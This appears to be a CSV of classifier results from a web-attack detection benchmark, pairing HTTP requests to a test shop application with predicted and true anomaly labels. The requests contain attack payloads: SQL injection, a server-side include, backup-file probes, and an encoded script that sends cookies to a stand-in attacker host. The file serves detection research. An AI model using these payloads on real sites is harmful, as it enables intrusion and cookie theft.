data,y_pred,y_test
gethttp://localhost:8080/_cti_pvt/services.cnf,anomalous,anomalous
gethttp://localhost:8080/iissamples/sdk/asp/docs/toolbar.asp,normal,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2<!--#include+file=""archivo_secreto""+-->",anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,normal,anomalous
gethttp://localhost:8080/tienda1.bak,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tsuji&password=envergonzado&nombre=stylianos&apellidos=franco+vilamaj�&email=kraa@pablobracamonte.ls&dni=65643274d&direccion=la+pradera+131,+10e&ciudad=burjassot&cp=18615&provincia=zaragoza&ntc=1816581279872417'or'a='a&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/servlet/simpleservlet,normal,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=blinnie&password=8jengib$r5&nombre=valiente&apellidos=sanfeliu+maurici&email=cabrera_bowles@alfombra.com.ge&dnia=35993227k&direccion=romero+de+cordoba+65,+&ciudad=cubla&cp=30890&provincia=valencia&ntc=8073640518599358&b1=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/publico/productos.jsp.old,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nabeel&pwd=vanidosa&remember=on/&b1=entrar,normal,anomalous
puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=neile&pwd=b7lg685&remember=on&b1=entrar,normal,anomalous
posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=an-son&pwd=4up493a562i5&remember=on&b1=entrar,normal,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fuerte&nombre=il,i?dio&apellidos=gorgone+oteo&email=tissier@b-sign.cg&dni=03028605b&direccion=calle+alboran+39,+&ciudad=millanes&cp=49731&provincia=tarragona&ntc=4096797311989091&b1=registrar",normal,anomalous
puthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,normal,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cupid&pwd=ar9ada&remember=on'+delete+from+users&b1=entrar,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=queso+manchego&precio=39&cantidad=53&b1=a�adir+al+carrito,anomalous,anomalous
gethttp://localhost:8080/tienda1/6909030637832563290.jsp,normal,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gedeon&password=megal�t,',ica&nombre=yuray&apellidos=montserrat+pugeo&email=jose_digges@blanquillos.aq&dni=45447133f&direccion=carretera+de+arcos,+174+&ciudad=aldeavieja+de+tormes&cp=46890&provincia=madrid&ntc=2175163155221209&b1=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,normal,anomalous
gethttp://localhost:8080/tienda1/global/creditos.jsp.bak,anomalous,anomalous
gethttp://localhost:8080/tienda1/asf-logo-wide,normal,anomalous
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7646sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&b1=confirmar,anomalous,anomalous
